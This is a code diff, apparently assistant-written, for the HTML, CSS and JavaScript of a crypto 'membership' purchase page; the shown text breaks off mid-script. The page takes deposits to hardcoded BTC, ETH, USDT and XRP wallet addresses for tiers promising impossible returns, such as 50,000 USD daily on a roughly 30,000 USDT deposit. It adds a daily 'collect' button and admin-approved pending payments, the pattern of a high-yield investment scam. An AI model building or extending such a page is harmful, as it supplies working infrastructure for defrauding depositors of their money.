@@ -18,33 +18,35 @@
     --gold: #f6c85f;
   }
   *{box-sizing:border-box}
+  html,body{height:100%;margin:0}
   body{
-    margin:0;
     min-height:100vh;
     background:
-      radial-gradient(900px 500px at 0% 0%, rgba(168,85,247,0.09), transparent 60%),
-      radial-gradient(900px 500px at 100% 100%, rgba(94,234,212,0.06), transparent 60%),
+      radial-gradient(900px 500px at 0% 0%, rgba(168,85,247,0.06), transparent 60%),
+      radial-gradient(900px 500px at 100% 100%, rgba(94,234,212,0.04), transparent 60%),
       linear-gradient(180deg,#030305 0%, #07070b 100%);
     font-family:Inter,system-ui,Segoe UI,Roboto,Arial;
     color:#eaf3ff;
-    overflow-x:hidden;
+    -webkit-font-smoothing:antialiased;
+    -moz-osx-font-smoothing:grayscale;
+    overflow-y:auto;
   }
 
-      .back-btn {
-      position: fixed;
-      top: 18px;
-      left: 18px;
-      background: rgba(255,255,255,0.08);
-      padding: 10px 14px;
-      border-radius: 10px;
-      border: 1px solid rgba(255,255,255,0.1);
-      font-weight: 600;
-      cursor: pointer;
-      backdrop-filter: blur(6px);
-      z-index: 30;
-    }
-
   .wrap{max-width:1100px;margin:28px auto;padding:20px}
+  .back-btn {
+    position: fixed;
+    top: 18px;
+    left: 18px;
+    background: rgba(255,255,255,0.08);
+    padding: 10px 14px;
+    border-radius: 10px;
+    border: 1px solid rgba(255,255,255,0.1);
+    font-weight: 600;
+    cursor: pointer;
+    backdrop-filter: blur(6px);
+    z-index: 30;
+  }
+
   h1{
     font-size:clamp(1.6rem,4vw,2.2rem);
     margin:6px 0 4px;
@@ -59,42 +61,23 @@
 
   .card {
     background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-    border-radius:18px; padding:18px; position:relative; overflow:hidden;
+    border-radius:14px; padding:16px; position:relative; overflow:hidden;
     border:1px solid rgba(255,255,255,0.04);
     transition: transform .28s cubic-bezier(.2,.9,.3,1), box-shadow .28s, border-color .28s;
   }
-  .card:hover{ transform: translateY(-8px) scale(1.02); box-shadow: 0 22px 60px rgba(0,0,0,0.7); border-color: rgba(168,85,247,0.5); }
+  .card:hover{ transform: translateY(-6px); box-shadow: 0 20px 50px rgba(0,0,0,0.7); border-color: rgba(168,85,247,0.4); }
   .card.active { box-shadow:0 0 40px rgba(94,234,212,0.25); border-color:rgba(94,234,212,0.5); }
 
-  /* GOLDEN GLOW (collect available) */
-  .card.glow {
-    box-shadow: 0 10px 40px rgba(246,200,95,0.16), inset 0 0 40px rgba(246,200,95,0.03);
-    border-color: rgba(246,200,95,0.35);
-    transform: translateY(-6px);
-    animation: goldPulse 2.2s infinite;
-  }
-  @keyframes goldPulse {
-    0% { box-shadow: 0 8px 26px rgba(246,200,95,0.10); }
-    50% { box-shadow: 0 18px 48px rgba(246,200,95,0.20); }
-    100% { box-shadow: 0 8px 26px rgba(246,200,95,0.10); }
-  }
-
-  .titleRow{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
-  .tier{font-weight:800;font-size:1.35rem}
-  .price{font-weight:700;color:#fff}
-  .desc{color:var(--muted);font-size:13px;margin-bottom:12px}
-  .pill{ display:inline-block; padding:6px 10px; border-radius:999px; font-weight:700; font-size:12px; background:rgba(255,255,255,0.06); }
-  .pill.live{ background:rgba(94,234,212,0.12); color:var(--success); }
-  .pill.none{ background:rgba(148,163,184,0.2); color:var(--muted); }
-  .pill.pending{ background:rgba(250,204,21,0.16); color:#facc15; }
-
-  .purchase{ display:flex; gap:8px; align-items:center; margin-top:auto }
-  .btn{ background:linear-gradient(90deg,var(--accent),var(--accent2)); border:none;color:#021;padding:10px 12px;border-radius:12px;font-weight:800;cursor:pointer; box-shadow:0 10px 30px rgba(168,85,247,0.3); }
-  .btn:hover{ transform:scale(1.04); box-shadow:0 16px 40px rgba(168,85,247,0.45); }
-  .ghost{ background:transparent; border:1px solid rgba(255,255,255,0.08); color:var(--muted); padding:8px 10px; border-radius:10px; cursor:pointer; font-weight:600; font-size:0.85rem; }
-  .ghost:hover{ border-color:var(--accent); color:#fff; }
   .badgelabel{ position:absolute; right:12px; top:12px; padding:6px 10px; border-radius:10px; background:linear-gradient(90deg,#ff6fb3,#7c3aed); font-weight:700; color:#fff; font-size:12px; }
 
+  .titleRow{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
+  .tier{font-weight:800;font-size:1.25rem}
+  .price{font-weight:700;color:#fff}
+  .desc{color:var(--muted);font-size:13px;margin-bottom:12px}
+  .purchase{ display:flex; gap:8px; align-items:center; margin-top:auto }
+  .btn{ background:linear-gradient(90deg,var(--accent),var(--accent2)); border:none;color:#021;padding:10px 12px;border-radius:10px;font-weight:800;cursor:pointer; box-shadow:0 10px 26px rgba(168,85,247,0.18); }
+  .ghost{ background:transparent; border:1px solid rgba(255,255,255,0.08); color:var(--muted); padding:8px 10px; border-radius:10px; cursor:pointer; font-weight:600; }
+  .ghost:hover{ border-color:var(--accent); color:#fff; }
   .disabledBtn { opacity: .5; pointer-events:none; filter: grayscale(.2); }
 
   .sidebar{ margin-top:20px; padding:16px; border-radius:12px; background:linear-gradient(180deg,#07070b,#0d0d10); border:1px solid rgba(255,255,255,0.03) }
@@ -104,39 +87,27 @@
   .progressBarWrap{ margin-top:10px; width:100%; height:6px; border-radius:999px; background:rgba(15,23,42,0.8); overflow:hidden; }
   .progressBar{ height:100%; border-radius:999px; width:0%; background:linear-gradient(90deg,var(--accent),var(--accent2)); transition:width .5s ease-out; }
 
-  /* BOOM animation elements */
-  .boom {
-    pointer-events:none;
-    position:absolute;
-    left:50%; top:12%;
-    transform:translate(-50%,-50%) scale(.9);
-    background:linear-gradient(90deg, rgba(255,255,255,0.06), rgba(255,255,255,0.03));
-    padding:12px 18px; border-radius:12px; font-weight:800; color:var(--gold);
-    border: 1px solid rgba(246,200,95,0.25);
-    box-shadow: 0 16px 40px rgba(246,200,95,0.12);
-    opacity:0; transition: all .45s cubic-bezier(.2,.9,.3,1);
-  }
-  .boom.show { opacity:1; transform:translate(-50%,-50%) scale(1.06); }
-
-  .floatTxt {
-    position:absolute; left:50%; top:6%;
-    transform:translate(-50%,-50%); font-weight:900; color:var(--gold);
-    font-size:18px; opacity:0;
-    text-shadow: 0 6px 20px rgba(246,200,95,0.14);
-    transition: all .9s cubic-bezier(.2,.9,.3,1);
-  }
-  .floatTxt.show { opacity:1; transform:translate(-50%,-140%); }
-
-  /* subtle animated shine */
-  .card::after{ content:''; position:absolute; left:-40%; top:-20%; width:60%; height:140%; transform:rotate(25deg) translateX(-50%); background:linear-gradient(90deg,rgba(255,255,255,0.01),rgba(255,255,255,0.12),rgba(255,255,255,0.01)); opacity:0; transition:opacity .45s; }
-  .card:hover::after{ opacity:1 }
-
-  /* modal small */
-  .modal{ position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(0,0,0,0.7); z-index:9999; }
+  /* modal */
+  .modal{ position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(0,0,0,0.7); z-index:9999; padding:20px; }
   .modal.show{ display:flex }
-  .modal-card{ width:95%; max-width:520px; background:#0b0b0d; padding:20px; border-radius:14px; border:1px solid rgba(255,255,255,0.04); box-shadow:0 30px 80px rgba(0,0,0,0.9) }
-  .membership-list { margin-top:12px; display:flex; flex-direction:column; gap:8px; }
-  .membership-item { padding:10px; border-radius:10px; background:rgba(255,255,255,0.02); display:flex; justify-content:space-between; align-items:center; font-weight:700; }
+  .modal-card{ width:100%; max-width:520px; background:#0b0b0d; padding:18px; border-radius:12px; border:1px solid rgba(255,255,255,0.04); box-shadow:0 26px 80px rgba(0,0,0,0.9) }
+  .modal-card h2{ margin:0 0 10px; font-size:1.1rem; color:var(--accent2) }
+
+  .form-row { display:flex; gap:8px; align-items:center; margin-top:8px; flex-wrap:wrap; }
+  .form-row select, .form-row input { flex:1; padding:10px; border-radius:8px; background:#07070b; color:#fff; border:1px solid rgba(255,255,255,0.03) }
+
+  .qr-box { width:260px; height:260px; margin:14px auto; border-radius:10px; background:#fff; display:flex; align-items:center; justify-content:center; overflow:hidden; }
+  .addr { font-family:monospace; word-break:break-all; background:rgba(255,255,255,0.03); padding:8px; border-radius:8px; margin-top:8px; text-align:center }
+
+  .small { font-size:0.9rem; color:var(--muted) }
+
+  /* responsive tweaks */
+  @media (max-width:560px){
+    .qr-box { width:200px; height:200px; }
+    .grid { gap:12px }
+    .card { padding:12px }
+    .badgelabel { right:8px; top:8px; padding:5px 8px; font-size:11px; }
+  }
 </style>
 </head>
 <body>
@@ -163,7 +134,7 @@
 
       <div style="margin-top:14px">
         <div class="small">Active / Pending memberships</div>
-        <div id="membershipsList" class="membership-list"></div>
+        <div id="membershipsList" class="membership-list" style="margin-top:8px"></div>
       </div>
     </div>
 
@@ -173,43 +144,72 @@
       <div style="height:10px"></div>
       <div class="small">Quick notes</div>
       <div class="small" style="margin-top:8px;color:var(--muted)">
-        Membership payments are <strong>PENDING</strong> until admin approves.
-        Once approved, daily payouts in USD begin and you must collect them daily (each membership separately).
+        Membership payments go to the <strong>Membership Payments</strong> admin area. Payments are <strong>PENDING</strong> until admin approves.
       </div>
     </div>
   </div>
 </div>
 
-<!-- modal (existing purchase UI left unchanged) -->
+<!-- Purchase Modal -->
 <div id="modal" class="modal" aria-hidden="true">
-  <div class="modal-card">
+  <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
     <button id="closeModal" class="ghost" style="float:right">Close</button>
     <h2 id="modalTitle">Purchase</h2>
+
     <div style="margin-top:8px">
       <label class="small">Select coin</label>
-      <select id="coinSel" style="width:100%;padding:10px;border-radius:10px;margin-top:6px;background:#07070b;border:1px solid rgba(255,255,255,0.03);color:#fff">
-        <option value="USDT">USDT (TRC-20)</option>
-        <option value="BTC">BTC</option>
-        <option value="ETH">ETH</option>
-      </select>
+      <div class="form-row" style="margin-top:6px">
+        <select id="coinSel">
+          <option value="USDT">USDT</option>
+          <option value="BTC">BTC</option>
+          <option value="ETH">ETH</option>
+          <option value="XRP">XRP</option>
+        </select>
+        <select id="chainSel" style="max-width:160px">
+          <option value="">Chain</option>
+        </select>
+      </div>
     </div>
-    <div id="qrArea" style="text-align:center;margin-top:12px">
-      <div class="qr" id="qrBox">QR</div>
-      <div class="addr small" id="addrBox">Address</div>
-      <div class="count small" id="amountBox">Amount: —</div>
+
+    <div style="margin-top:10px">
+      <div class="qr-box" id="qrBox"><img id="qrImg" src="" alt="qr" style="width:100%;height:100%;object-fit:contain"></div>
+      <div class="addr small" id="addrBox">Address will appear here</div>
+      <div class="count small" id="amountBox" style="margin-top:8px">Amount: —</div>
+      <div id="txInfo" class="small" style="margin-top:8px;color:var(--muted)"></div>
     </div>
+
     <div style="display:flex;gap:8px;margin-top:16px;justify-content:center">
-      <button id="createDeposit" class="btn">Purchase Membership</button>
+      <button id="createDeposit" class="btn">Create Payment</button>
       <button id="checkStatus" class="ghost">Check Status</button>
     </div>
-    <div id="txInfo" class="small" style="margin-top:12px"></div>
   </div>
 </div>
 
 <script>
-// --- config & DOM refs (unchanged from your file) ---
+/* ---------------- CONFIG ---------------- */
 const API_BASE = window.location.origin;
-const WALLET_ADDR_TRON = "TAx9KbxS2qh7mwafC3VX6gCGJP8tWVaK9R";
+
+// Addresses & QR images provided by you (confirmed)
+const ADDRESSES = {
+  BTC: { Bitcoin: { address: "bc1qaq2ffv87mmn9jhud60s8zhnk5ycguk2umxjcxt", qr: "/img/qr_btc.png" } },
+  ETH: { ERC20: { address: "0x216696817bAF598Fa4cC4461AEB3CB34476E52Dc", qr: "/img/qr_eth.png" } },
+  USDT: {
+    TRC20: { address: "TAx9KbxS2qh7mwafC3VX6gCGJP8tWVaK9R", qr: "/img/qr_usdt_tr.png" },
+    ERC20: { address: "0x216696817bAF598Fa4cC4461AEB3CB34476E52Dc", qr: "/img/qr_usdterc.png" },
+    BEP20: { address: "0x216696817bAF598Fa4cC4461AEB3CB34476E52Dc", qr: "/img/qr_bnb.png" }
+  },
+  XRP: { XRP: { address: "rP4HSbDhBpMyTtSZJQxQtqsqiNQvovujRE", qr: "/img/qr_xrp.png" } }
+};
+
+// Chain options mapping
+const CHAIN_MAP = {
+  BTC: ["Bitcoin"],
+  ETH: ["ERC20"],
+  USDT: ["TRC20","ERC20","BEP20"],
+  XRP: ["XRP"]
+};
+
+// Membership tiers (same as your server values)
 const TIERS = {
   V1: { deposit: 51,    daily:10,    days:5,  bonus:50,     label:'V1' },
   V2: { deposit: 1498.5,daily:100,   days:7,  bonus:3000,   label:'V2' },
@@ -217,24 +217,29 @@ const TIERS = {
   V4: { deposit: 29998.5,daily:50000,days:15, bonus:300000, label:'V4' },
   V5: { deposit: 50001, daily:75000, days:30, bonus:500000, label:'V5' }
 };
-let selectedTier = null;
-let pendingTxByTier = {};
-let pollTimer = null;
-let pollingTier = null;
-let profileUser = null;
 
-// DOM
+/* ---------------- STATE ---------------- */
+let profileUser = null;
+let selectedTier = null;
+let pendingTxByTier = {}; // { tier: txId }
+let pollingTimer = null;
+let pollingFor = null;
+
+/* ---------------- DOM ---------------- */
 const tierGrid = document.getElementById('tierGrid');
 const modal = document.getElementById('modal');
 const modalTitle = document.getElementById('modalTitle');
 const closeModal = document.getElementById('closeModal');
 const coinSel = document.getElementById('coinSel');
+const chainSel = document.getElementById('chainSel');
+const qrImg = document.getElementById('qrImg');
 const qrBox = document.getElementById('qrBox');
 const addrBox = document.getElementById('addrBox');
 const amountBox = document.getElementById('amountBox');
 const createDepositBtn = document.getElementById('createDeposit');
 const checkStatusBtn = document.getElementById('checkStatus');
 const txInfo = document.getElementById('txInfo');
+
 const memStatus = document.getElementById('memStatus');
 const memDetails = document.getElementById('memDetails');
 const memBadge = document.getElementById('memBadge');
@@ -243,361 +248,366 @@ const memProgress = document.getElementById('memProgress');
 const walletEl = document.getElementById('wallet');
 const membershipsList = document.getElementById('membershipsList');
 
-// ensure logged in & load profile
-(async function ensureLogin(){
+/* ---------------- HELPERS ---------------- */
+function el(text){ const d = document.createElement('div'); d.innerHTML = text; return d; }
+
+async function ensureLoggedIn() {
   try {
     const res = await fetch(`${API_BASE}/api/profile`, { credentials:'include' });
-    if (res.status === 401) return location.href="login.html";
+    if (res.status === 401) { window.location.href = 'login.html'; return false; }
     const j = await res.json();
     profileUser = j.user;
-    renderProfile(j.user);
-    await loadWalletUSD();
-    renderCards();
-  } catch (err){
-    console.error("Profile load error on membership:", err);
-    location.href="login.html";
+    return true;
+  } catch (e) {
+    console.error('Profile check failed', e);
+    window.location.href = 'login.html';
+    return false;
   }
-})();
-
-async function loadWalletUSD(){
-  try{
-    const res = await fetch(`${API_BASE}/api/total-usd`, {credentials:'include'});
-    const data = await res.json();
-    if(!data.ok) { walletEl.innerText = "—"; return; }
-    walletEl.innerText = "$" + Number(data.totalUSD || 0).toLocaleString(undefined,{ minimumFractionDigits:2, maximumFractionDigits:2 });
-  }catch(e){ console.error("total-usd error:", e); walletEl.innerText = "—"; }
 }
 
-// helper: has user collected today?
-function collectedToday(membership){
-  if(!membership || !membership.lastPayout) return false;
-  const last = new Date(membership.lastPayout);
-  const now = new Date();
-  return last.getFullYear() === now.getFullYear() && last.getMonth() === now.getMonth() && last.getDate() === now.getDate();
+async function loadWalletTotal() {
+  try {
+    const res = await fetch(`${API_BASE}/api/total-usdt`, { credentials:'include' });
+    const j = await res.json();
+    if (j && j.totalUSDT != null) {
+      walletEl.innerText = '$' + Number(j.totalUSDT).toLocaleString(undefined,{ minimumFractionDigits:2, maximumFractionDigits:6 });
+    } else {
+      walletEl.innerText = '—';
+    }
+  } catch(e){ walletEl.innerText = '—'; }
 }
 
-// RENDER CARDS (updated to include collect button & animations)
-// Note: we use profileUser.memberships (array). Completed memberships are hidden from main UI.
+/* ---------------- RENDER UI ---------------- */
 function renderCards(){
   tierGrid.innerHTML = '';
-
-  // build a map: latest ACTIVE (or PENDING) membership per tier (prefer ACTIVE)
-  const memberships = (profileUser && Array.isArray(profileUser.memberships)) ? profileUser.memberships : [];
-  const activeByTier = {};
+  // map latest non-COMPLETED membership per tier
+  const memberships = Array.isArray(profileUser.memberships) ? profileUser.memberships : [];
+  const mapByTier = {};
   memberships.forEach(m => {
-    if (!m || !m.tier) return;
-    // ignore COMPLETED (Q3: B wants them to disappear from list)
-    if (m.status === 'COMPLETED') return;
-    // prefer ACTIVE over PENDING when choosing which membership to show on a tier card
-    if (!activeByTier[m.tier]) activeByTier[m.tier] = m;
+    if(!m || !m.tier) return;
+    if(m.status === 'COMPLETED') return;
+    if(!mapByTier[m.tier]) mapByTier[m.tier] = m;
     else {
-      // if current stored is PENDING and this is ACTIVE, replace
-      if (activeByTier[m.tier].status !== 'ACTIVE' && m.status === 'ACTIVE') activeByTier[m.tier] = m;
-      // otherwise keep newest (createdAt)
-      else if (new Date(m.createdAt) > new Date(activeByTier[m.tier].createdAt)) activeByTier[m.tier] = m;
+      if(mapByTier[m.tier].status !== 'ACTIVE' && m.status === 'ACTIVE') mapByTier[m.tier] = m;
+      else if(new Date(m.createdAt) > new Date(mapByTier[m.tier].createdAt)) mapByTier[m.tier] = m;
     }
   });
 
   Object.keys(TIERS).forEach(k=>{
     const t = TIERS[k];
-    const hasPending = pendingTxByTier[k];
-    const membershipForTier = activeByTier[k] || null;
-    const isActiveForTier = membershipForTier && membershipForTier.status === 'ACTIVE';
-    const isPendingForTier = membershipForTier && membershipForTier.status === 'PENDING';
+    const member = mapByTier[k];
+    const isActive = member && member.status === 'ACTIVE';
+    const isPending = member && member.status === 'PENDING';
+    const hasPendingTx = pendingTxByTier[k];
 
-    const div = document.createElement('div');
-
-    // card classes: if active & collect available => glow
-    let cardCls = 'card';
-    if (isActiveForTier && !collectedToday(membershipForTier)) cardCls += ' glow';
-    if (isActiveForTier || isPendingForTier) cardCls += ' active';
-
-    div.className = cardCls;
-    div.innerHTML = `
+    const card = document.createElement('div');
+    card.className = 'card' + ((isActive || isPending) ? ' active' : '');
+    card.innerHTML = `
       <div class="badgelabel">${t.label}</div>
       <div class="titleRow">
         <div class="tier">${t.label}</div>
         <div class="price">${t.deposit.toLocaleString()} USDT</div>
       </div>
-
-      <div class="desc">
-        Daily <strong>${t.daily.toLocaleString()}</strong> USD · ${t.days} days · Bonus ${t.bonus.toLocaleString()} USD
-      </div>
-
+      <div class="desc">Daily <strong>${t.daily.toLocaleString()}</strong> USD · ${t.days} days · Bonus ${t.bonus.toLocaleString()} USD</div>
       <div class="purchase" id="purchase_${k}">
-        <button class="btn" id="buy_${k}" data-tier="${k}">${ (isActiveForTier || isPendingForTier) ? (isActiveForTier ? "Active" : "Pending") : "Purchase" }</button>
-        <button class="ghost" type="button" id="details_${k}">Details</button>
+        <button class="btn" id="buy_${k}">${ (isActive || isPending) ? (isActive ? "Active" : "Pending") : "Purchase" }</button>
+        <button class="ghost" id="details_${k}">Details</button>
       </div>
-
-      ${hasPending ? `<div class="small" style="color:#facc15;margin-top:8px;">Pending payment for ${k}</div>` : ""}
+      ${ hasPendingTx ? `<div class="small" style="color:#facc15;margin-top:8px;">Pending payment for ${k}</div>` : '' }
     `;
 
-    // show collect area if active membership exists for this tier
-    if (membershipForTier && membershipForTier.status === 'ACTIVE') {
-      const m = membershipForTier;
+    // collect UI when active
+    if(isActive){
+      const m = member;
       const paid = m.daysPaid || 0;
       const total = m.durationDays || t.days;
       const daily = m.dailyAmount || t.daily;
-
       const collectWrap = document.createElement('div');
-      collectWrap.style.marginTop = "14px";
+      collectWrap.style.marginTop = '12px';
 
-      if (paid < total) {
-        if (!collectedToday(m)) {
+      if(paid < total){
+        if(!collectedToday(m)) {
           collectWrap.innerHTML = `
             <div style="display:flex;justify-content:space-between;align-items:center;gap:12px">
-              <div style="font-size:14px;color:var(--muted)">Daily: <b style="color:#fff">${daily} USD</b> · ${paid}/${total} collected</div>
-              <button class="btn" id="collect_${m._id}" style="background:linear-gradient(90deg,var(--gold),#ffdd80);color:#071;font-weight:900;border-radius:12px;padding:10px 14px">COLLECT</button>
+              <div style="font-size:14px;color:var(--muted)">Daily: <b style="color:#fff">${daily} USD</b> · ${paid}/${total}</div>
+              <button class="btn" id="collect_${m._id}" style="background:linear-gradient(90deg,var(--gold),#ffdd80);color:#071;font-weight:900;border-radius:10px;padding:8px 12px">COLLECT</button>
             </div>
-            <div class="boom" id="boom_${m._id}">+${daily} USD Collected</div>
-            <div class="floatTxt" id="float_${m._id}">+${daily} USD</div>
           `;
         } else {
-          collectWrap.innerHTML = `
-            <div style="display:flex;justify-content:space-between;align-items:center;gap:12px">
-              <div style="font-size:14px;color:var(--muted)"><b style="color:#7ef6b8">Collected ✓</b> Come back tomorrow · ${paid}/${total}</div>
-              <button class="ghost disabledBtn">Collected</button>
-            </div>
-          `;
+          collectWrap.innerHTML = `<div style="display:flex;justify-content:space-between;align-items:center;gap:12px"><div style="font-size:14px;color:var(--muted)"><b style="color:#7ef6b8">Collected ✓</b> Come back tomorrow · ${paid}/${total}</div><button class="ghost disabledBtn">Collected</button></div>`;
         }
       } else {
-        // membership completed — per Q3:B we hide completed memberships from main list, but in case, show a buy again button
-        collectWrap.innerHTML = `
-          <div style="display:flex;justify-content:space-between;align-items:center">
-            <div style="font-size:14px;color:var(--muted)">Membership completed · collected ${paid}/${total}</div>
-            <button class="btn" id="renew_${k}">Buy Again</button>
-          </div>
-        `;
+        collectWrap.innerHTML = `<div style="display:flex;justify-content:space-between;align-items:center"><div style="font-size:14px;color:var(--muted)">Membership completed · collected ${paid}/${total}</div><button class="btn" id="renew_${k}">Buy Again</button></div>`;
       }
-
-      div.appendChild(collectWrap);
+      card.appendChild(collectWrap);
     }
 
-    tierGrid.appendChild(div);
+    tierGrid.appendChild(card);
 
-    // attach event listeners
-    const buyBtn = div.querySelector(`#buy_${k}`);
-    const detailsBtn = div.querySelector(`#details_${k}`);
-    if(buyBtn) {
-      // disable buy button if an active/pending membership of same tier exists
-      if (isActiveForTier || isPendingForTier || hasPending) {
-        buyBtn.classList.add('disabledBtn');
-      } else {
-        buyBtn.onclick = ev => onPurchaseClick(k, ev);
-      }
+    // listeners
+    const buyBtn = card.querySelector(`#buy_${k}`);
+    const detailsBtn = card.querySelector(`#details_${k}`);
+    if(buyBtn){
+      if(isActive || isPending || pendingTxByTier[k]) buyBtn.classList.add('disabledBtn');
+      else buyBtn.addEventListener('click', (ev)=> onPurchaseClick(k));
     }
-    if(detailsBtn) detailsBtn.onclick = () => {
+    if(detailsBtn) detailsBtn.addEventListener('click', ()=> {
       alert(`Tier ${k}\n\nDaily: ${t.daily} USD\nDuration: ${t.days} days\nBonus: ${t.bonus} USD at completion.`);
-    };
+    });
 
-    // collect handlers (each membership has unique id)
-    if (membershipForTier && membershipForTier.status === 'ACTIVE') {
-      const m = membershipForTier;
-      const collectBtn = div.querySelector(`#collect_${m._id}`);
-      if (collectBtn) {
-        collectBtn.onclick = async (e) => {
-          e.stopPropagation();
-          await handleCollect(m._id, t);
-        };
+    // collect handler
+    if(isActive){
+      const m = member;
+      const collectBtn = card.querySelector(`#collect_${m._id}`);
+      if(collectBtn && !collectedToday(m)){
+        collectBtn.addEventListener('click', ()=> handleCollect(m._id));
       }
-      const renewBtn = div.querySelector(`#renew_${k}`);
-      if (renewBtn) renewBtn.onclick = (e) => onPurchaseClick(k, e);
+      const renewBtn = card.querySelector(`#renew_${k}`);
+      if(renewBtn) renewBtn.addEventListener('click', ()=> onPurchaseClick(k));
     }
   });
 }
 
-// handle collect click: calls API, triggers boom animation and updates UI
-async function handleCollect(membershipId, tierCfg){
-  try {
-    if(!membershipId) return alert("Invalid membership");
-    // find the membership object locally
-    const memberships = (profileUser && Array.isArray(profileUser.memberships)) ? profileUser.memberships : [];
-    const m = memberships.find(x => String(x._id) === String(membershipId));
-    if(!m) return alert("Membership not found locally. Refreshing profile.");
-    if(m.status !== 'ACTIVE') return alert("Membership not active.");
-    if(m.daysPaid >= m.durationDays) return alert("Membership already completed.");
-    if(collectedToday(m)) return alert("Already collected today.");
-
-    // disable card UI quickly
-    const card = Array.from(tierGrid.children).find(c => c.querySelector(`#collect_${membershipId}`) || c.querySelector(`#buy_${m.tier}`));
-    if(card) card.classList.add('disabledBtn');
-
-    const res = await fetch(`${API_BASE}/api/membership/collect`, {
-      method: 'POST',
-      credentials: 'include',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({ membershipId })
-    });
-    const json = await res.json();
-    if(!res.ok) throw new Error(json.error || 'Collect failed');
-
-    // update local membership entry
-    // refresh profile from server to keep consistent
-    await refreshProfile();
-
-    // show boom + float pop
-    const boomEl = card ? card.querySelector(`#boom_${membershipId}`) : null;
-    const floatEl = card ? card.querySelector(`#float_${membershipId}`) : null;
-    if(boomEl){
-      boomEl.classList.add('show');
-      setTimeout(()=> boomEl.classList.remove('show'), 1400);
-    }
-    if(floatEl){
-      floatEl.classList.add('show');
-      setTimeout(()=> floatEl.classList.remove('show'), 1200);
-    }
-
-    // optimistic wallet refresh
-    await loadWalletUSD();
-    // re-render membership UI after a short delay so animation is visible
-    setTimeout(()=>{ renderCards(); renderMembershipSidebar(); }, 700);
-
-  } catch (err) {
-    console.error("collect error:", err);
-    alert(err.message || "Collect failed");
-  } finally {
-    // re-enable UI
-    const card = Array.from(tierGrid.children).find(c => c.querySelector(`#collect_${membershipId}`) || c.querySelector(`#buy_${(profileUser && profileUser.memberships) ? profileUser.memberships.find(m => m._id===membershipId)?.tier : ''}`));
-    if(card) card.classList.remove('disabledBtn');
-  }
+function collectedToday(membership){
+  if(!membership || !membership.lastPayout) return false;
+  const last = new Date(membership.lastPayout);
+  const now = new Date();
+  return last.getFullYear()===now.getFullYear() && last.getMonth()===now.getMonth() && last.getDate()===now.getDate();
 }
 
-// ---------- existing purchase modal code (slightly adjusted) ----------
-function onPurchaseClick(tier, ev){
-  ev.stopPropagation();
+/* ---------------- COLLECT (calls server) ---------------- */
+async function handleCollect(membershipId){
+  try{
+    if(!membershipId) return alert('Invalid membership');
+    const res = await fetch(`${API_BASE}/api/membership/collect`, {
+      method:'POST', credentials:'include', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ membershipId })
+    });
+    const j = await res.json();
+    if(!res.ok) throw new Error(j.error || 'Collect failed');
+    await refreshProfile();
+    await loadWalletTotal();
+    alert('Collected: ' + (j.payout || ''));
+  }catch(e){ alert(e.message || 'Collect failed'); console.error(e); }
+}
+
+/* ---------------- PURCHASE FLOW (modal + payment) ---------------- */
+function onPurchaseClick(tier){
   selectedTier = tier;
   const cfg = TIERS[tier];
   modalTitle.innerText = `Purchase ${tier} — Pay ${cfg.deposit} USDT`;
-  coinSel.value = 'USDT';
   amountBox.innerText = `Amount: ${cfg.deposit} USDT`;
-  updateQRandAddr();
-  txInfo.innerText="";
-  // if there's already a pending tx we keep disabled
-  if(pendingTxByTier[tier]){ createDepositBtn.classList.add('disabledBtn'); createDepositBtn.disabled = true; } else { createDepositBtn.classList.remove('disabledBtn'); createDepositBtn.disabled = false; }
+  coinSel.value = 'USDT';
+  populateChains('USDT');
+  updateQRAddr();
+  txInfo.innerText = '';
+  createDepositBtn.disabled = false;
+  createDepositBtn.classList.remove('disabledBtn');
   modal.classList.add('show');
 }
-function updateQRandAddr(){
-  const coin = coinSel.value;
-  if(coin==='USDT'){
-    const qr = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=tron:${WALLET_ADDR_TRON}`;
-    qrBox.innerHTML = `<img src="${qr}" style="width:100%;height:100%;object-fit:contain">`;
-    addrBox.innerText = WALLET_ADDR_TRON;
-  } else {
-    addrBox.innerText = coin === 'BTC' ? "Your_BTC_Address" : "Your_ETH_Address";
-    qrBox.innerHTML = `<div style="color:#000;font-weight:700">BTC/ETH</div>`;
-  }
+
+function populateChains(coin){
+  chainSel.innerHTML = '';
+  const chains = CHAIN_MAP[coin] || [];
+  if(!chains.length){ chainSel.innerHTML = '<option value="">—</option>'; return; }
+  chains.forEach(c => {
+    const opt = document.createElement('option');
+    opt.value = c;
+    opt.innerText = c;
+    chainSel.appendChild(opt);
+  });
+  // auto-select first chain for convenience
+  chainSel.selectedIndex = 0;
 }
-coinSel.addEventListener('change', updateQRandAddr);
-closeModal.onclick = ()=> { modal.classList.remove('show'); stopPolling(); }
-modal.addEventListener('click', (e)=>{ if(e.target === modal){ modal.classList.remove('show'); stopPolling(); } });
-createDepositBtn.onclick = async ()=>{
-  if(!selectedTier) return;
-  // ensure user doesn't currently have ACTIVE or PENDING membership same tier
-  const memberships = (profileUser && Array.isArray(profileUser.memberships)) ? profileUser.memberships : [];
-  const hasActiveOrPending = memberships.some(m => m.tier === selectedTier && (m.status === 'ACTIVE' || m.status === 'PENDING'));
-  if (hasActiveOrPending) {
-    txInfo.innerText = "You already have an active/pending membership of this tier.";
+
+function updateQRAddr(){
+  const coin = coinSel.value;
+  const chain = chainSel.value || (CHAIN_MAP[coin] ? CHAIN_MAP[coin][0] : '');
+  let info = null;
+  if(ADDRESSES[coin] && ADDRESSES[coin][chain]) info = ADDRESSES[coin][chain];
+  if(!info){
+    addrBox.innerText = 'Address not configured';
+    qrImg.src = '';
+    qrImg.style.display = 'none';
+    qrBox.style.background = '#111';
     return;
   }
+  addrBox.innerText = info.address;
+  // show img if exists (will 404 if missing)
+  qrImg.src = info.qr;
+  qrImg.style.display = 'block';
+  qrBox.style.background = '#fff';
+}
 
-  if(pendingTxByTier[selectedTier]){ txInfo.innerText = "You already created a pending payment."; return; }
-  createDepositBtn.disabled = true;
-  const prev = createDepositBtn.innerText;
-  createDepositBtn.innerText="Purchasing...";
+// coin / chain change listeners
+coinSel.addEventListener('change', ()=> {
+  populateChains(coinSel.value);
+  updateQRAddr();
+});
+chainSel.addEventListener('change', updateQRAddr);
+
+// modal controls
